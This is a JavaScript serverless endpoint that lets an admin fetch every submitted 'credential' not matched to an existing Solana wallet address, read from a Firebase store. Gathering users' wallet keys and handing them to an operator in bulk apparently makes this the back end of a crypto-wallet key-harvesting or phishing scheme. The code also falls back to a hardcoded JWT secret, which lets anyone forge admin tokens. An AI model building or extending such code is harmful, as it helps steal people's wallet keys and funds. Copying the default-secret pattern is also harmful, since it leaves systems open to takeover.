/**
 * Get Off-Chain Keys Endpoint (ADMIN ONLY)
 *
 * Returns all credentials that were submitted but could not be matched
 * to any existing on-chain Solana wallet address.
 */

const jwt = require('jsonwebtoken');
const { FirebaseWalletStore } = require('./utils/firebaseWalletStore');

const JWT_SECRET = process.env.JWT_SECRET || 'dev-secret-key-change-in-production-use-crypto-randomBytes';

const headers = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization',
  'Access-Control-Allow-Methods': 'GET, OPTIONS',
  'Content-Type': 'application/json'
};

exports.handler = async (event) => {
  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  if (event.httpMethod !== 'GET') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }

  // Require admin JWT
  const authHeader = event.headers.authorization || event.headers.Authorization;
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return {
      statusCode: 401,
      headers,
      body: JSON.stringify({ error: 'Admin authorization required' })
    };
  }

  const token = authHeader.substring(7);
  let decoded;
  try {
    decoded = jwt.verify(token, JWT_SECRET);
  } catch (error) {
    return {
      statusCode: 401,
      headers,
      body: JSON.stringify({ error: 'Invalid or expired admin token' })
    };
  }

  if (!decoded.isAdmin && decoded.type !== 'admin') {
    return {
      statusCode: 403,
      headers,
      body: JSON.stringify({ error: 'Admin access required' })
    };
  }

  try {
    const walletStore = new FirebaseWalletStore();
    const keys = await walletStore.getAllOffChainKeys();

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        total: keys.length,
        offChainKeys: keys
      })
    };
  } catch (error) {
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        error: 'Failed to fetch off-chain keys',
        message: error.message
      })
    };
  }
};
